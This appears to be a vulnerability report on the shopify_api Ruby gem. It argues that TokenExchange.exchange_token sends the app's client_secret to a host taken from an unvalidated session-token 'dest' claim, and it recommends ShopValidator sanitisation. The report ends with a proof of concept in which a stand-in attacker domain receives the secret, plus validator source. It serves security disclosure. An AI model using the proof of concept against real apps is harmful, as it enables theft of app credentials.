This confirms a consistent pattern across every other credential-sending flow (`RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`) that calls `Utils::ShopValidator.sanitize!(shop)` before building the `Session`/`HttpClient` that will carry `client_secret` — except `TokenExchange.exchange_token`, which derives `dest_shop` straight from the unvalidated JWT `dest` claim and skips `ShopValidator` entirely.

### Title
`TokenExchange.exchange_token` sends the app's `client_secret` to an unvalidated host derived from the session token's `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for the OAuth `access_token` request directly from the `dest` claim of the caller-supplied session token, without ever passing it through `Utils::ShopValidator`, unlike every sibling method in the same file and module that also transmits `client_secret`.

### Finding Description
`exchange_token` decodes the JWT session token and takes the shop host straight from the token payload: `jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token); dest_shop = jwt_payload.shop` [1](#0-0) . `JwtPayload#shop` merely strips the `https://` prefix off the `dest` claim with no domain allow-listing: `def shop; @dest.gsub("https://", ""); end` [2](#0-1) . The JWT decode step only checks the signature, expiry/nbf window, and that `aud == Context.api_key` [3](#0-2)  — nothing constrains `dest` to a trusted Shopify domain (`*.myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`, `shopify.com`).

That unvalidated `dest_shop` is used to build the session that is fed into `HttpClient`: `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` then `client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [4](#0-3) . `HttpClient#initialize` builds the outbound URL directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"` [5](#0-4) . The POST body sent to that host includes the app's `client_secret`: `body = { client_id: ..., client_secret: ShopifyAPI::Context.api_secret_key, grant_type: TOKEN_EXCHANGE_GRANT_TYPE, subject_token: session_token, ... }` [6](#0-5) .

Every other flow in this same module family that builds a `Session`/`HttpClient` carrying `client_secret` runs the caller-controlled shop string through `Utils::ShopValidator.sanitize!` first: `TokenExchange.migrate_to_expiring_token` (`validated_shop = Utils::ShopValidator.sanitize!(shop)` [7](#0-6) ), `RefreshToken.refresh_access_token` [8](#0-7) , and `ClientCredentials.client_credentials` [9](#0-8) . `ShopValidator` exists precisely to reject non-Shopify hosts: `sanitize!` raises `Errors::InvalidShopError` unless the domain matches `TRUSTED_SHOPIFY_DOMAINS` [10](#0-9) . `exchange_token` is the sole path in the file that omits this check, despite the CHANGELOG noting the shop is now taken from the token's `dest` claim as part of the same release that introduced `ShopValidator` [11](#0-10) .

The binding that should hold but doesn't: `host that receives client_secret == a host in ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. Before the fix intent (as applied everywhere else), this equality is enforced via `sanitize!`; in `exchange_token`, `host_receiving_client_secret = dest_claim_from_caller_supplied_JWT`, which is not constrained to be a trusted Shopify domain.

### Impact Explanation
A session token's `dest` claim reflects the shop's canonical/primary domain as configured in Shopify — including any merchant-configured, merchant-verified custom domain. An attacker who controls their own Shopify store (trivial to obtain) and points/verifies a custom domain they own as that store's primary domain can cause the store's session token (still validly signed for this app, since signing only requires a legitimate install and the app's shared secret path through Shopify) to carry `dest = "https://attacker-controlled-domain"`. When the host application calls `TokenExchange.exchange_token` with that token, this library will issue an HTTPS POST containing the app's `client_id` and `client_secret` directly to the attacker's server. This is SSRF carrying the app's own long-lived credential (`client_secret`), letting the attacker harvest it and subsequently mint access tokens / impersonate the app for any shop — a direct match for the "SSRF with the app's credentials" and "credential leakage" impact categories.

### Likelihood Explanation
Reaching this path only requires presenting a session token whose signature validates for the app (i.e., a token minted by Shopify for a shop where the app is installed) — no privileged internal access, employee token, or leaked secret is needed. Any developer/attacker can install their own app instance on a store they control, associate an arbitrary custom domain, and then supply that store's legitimate session token to a host app's token-exchange endpoint that forwards it into this gem, unlike `migrate_to_expiring_token`/`refresh_access_token`/`client_credentials` where the equivalent `shop` value is sanitized.

### Recommendation
Sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (mirroring `migrate_to_expiring_token`) before constructing `shop_session` in `exchange_token`, e.g.:
```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
and use the sanitized value both for `Session.new(shop:)` and for the final `Session.from(shop: dest_shop, ...)` call.

### Proof of Concept
1. Attacker creates their own development/partner Shopify store and configures a custom domain they own (e.g., `attacker.evil-example.com`) as that store's primary domain (Shopify supports and verifies custom domains per store).
2. Attacker installs the target app on that store; Shopify's App Bridge issues a session token (`id_token`) with `dest: "https://attacker.evil-example.com"`, signed with the app's shared secret as usual — this signature check passes in `JwtPayload#initialize`.
3. Attacker sends this session token to the target app's backend endpoint that calls:
   ```ruby
   ShopifyAPI::Auth::TokenExchange.exchange_token(
     session_token: attacker_session_token,
     requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
   )
   ```
4. Inside `exchange_token`, `dest_shop` becomes `"attacker.evil-example.com"`, and `HttpClient` sends `POST https://attacker.evil-example.com/admin/oauth/access_token` with a JSON body containing `client_id` and `client_secret` in cleartext — captured by the attacker's server, exfiltrating the app's `client_secret`.

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
